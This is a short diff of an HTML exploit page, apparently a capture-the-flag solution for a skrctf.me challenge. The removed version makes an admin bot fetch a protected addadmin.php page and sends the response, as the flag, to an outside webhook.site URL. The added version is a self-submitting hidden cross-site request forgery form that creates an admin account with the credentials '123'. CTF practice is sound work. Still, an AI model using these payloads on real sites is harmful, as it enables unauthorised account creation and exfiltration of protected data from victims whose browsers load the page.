@@ -1,15 +1,11 @@
-<!DOCTYPE html>
 <html>
-<head><title>Exploit</title></head>
-<body>
-<script>
-  // Force admin bot to load the secret page
-  fetch("https://skrctf.me/ports/71f73fb1e3b7d6dc0b4f82f76ae542fd/addadmin.php")
-    .then(r => r.text())
-    .then(t => {
-        // send the response text (the flag) to your webhook
-        fetch("https://webhook.site/5aad0fcd-0ad2-48bb-950c-7265ce3113da?flag=" + btoa(t));
-    });
-</script>
-</body>
+  <body>
+    <form action="https://skrctf.me/ports/71f73fb1e3b7d6dc0b4f82f76ae542fd/addadmin.php" method="POST" id="f">
+      <input type="hidden" name="username" value="123">
+      <input type="hidden" name="password" value="123">
+    </form>
+    <script>
+      document.getElementById('f').submit();
+    </script>
+  </body>
 </html>
